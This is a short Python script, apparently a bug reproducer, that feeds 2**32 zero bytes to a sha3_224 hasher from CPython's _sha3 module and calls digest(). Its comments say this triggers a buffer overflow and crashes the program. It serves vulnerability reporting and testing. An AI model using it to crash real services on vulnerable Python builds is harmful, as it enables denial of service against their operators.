# Import the _sha3 module
import _sha3

# Create a sha3_224 object
h = _sha3.sha3_224()

# Update the object with a large input
# This input has 2**32 bytes
h.update(b"\x00" * 4294967296)

# Try to get the digest of the object
# This will trigger the buffer overflow and crash the program
h.digest()